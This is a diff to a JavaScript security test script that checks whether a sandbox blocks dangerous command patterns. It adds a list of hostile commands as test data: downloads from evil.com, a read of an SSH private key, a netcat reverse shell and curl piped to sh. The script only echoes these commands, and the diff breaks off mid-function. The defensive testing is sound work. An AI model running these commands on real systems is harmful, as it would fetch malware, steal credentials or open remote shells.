@@ -228,3 +228,46 @@ async function testBehavioralThresholds() {
   if (spawnCount < thresholds.maxProcessSpawns) {
     log(`  ✅ Process spawns stopped at ${spawnCount}/${thresholds.maxProcessSpawns}`, 'green');
   } else {
+    log(`  ⚠️  Process spawns reached ${spawnCount} (may need to check firewall logs)`, 'yellow');
+  }
+}
+
+// ============================================
+// 4. COMMAND EXECUTION TESTS
+// ============================================
+async function testBlockedCommands() {
+  log('\n💻 TESTING BLOCKED COMMAND PATTERNS', 'cyan');
+  log('='.repeat(50));
+  
+  const blockedCommands = [
+    { cmd: `curl -o /tmp/malware https://evil.com/mal`, name: 'curl download' },
+    { cmd: `wget https://evil.com/malware`, name: 'wget download' },
+    { cmd: `cat ~/.ssh/id_rsa`, name: 'Read SSH key via cat' },
+    { cmd: `nc -e /bin/sh evil.com 4444`, name: 'Netcat reverse shell' },
+    { cmd: `bash -c "curl evil.com | sh"`, name: 'Pipe to shell' },
+  ];
+
+  for (const test of blockedCommands) {
+    try {
+      await new Promise(r => setTimeout(r, 100));
+      
+      // We don't actually execute malicious commands, just test if spawn works
+      const child = spawn('sh', ['-c', `echo "Testing: ${test.cmd}"`], {
+        timeout: 2000,
+        stdio: 'pipe'
+      });
+      
+      await new Promise((resolve, reject) => {
+        child.on('close', (code) => {
+          results.commands.push({
+            command: test.name,
+            blocked: code !== 0,
+            exitCode: code
+          });
+          if (code === 0) {
+            log(`  ⚠️  ${test.name}: Command pattern not blocked (AUTH_EXEC)`, 'yellow');
+          } else {
+            log(`  ✅ ${test.name}: Blocked`, 'green');
+          }
+          resolve();
+        });
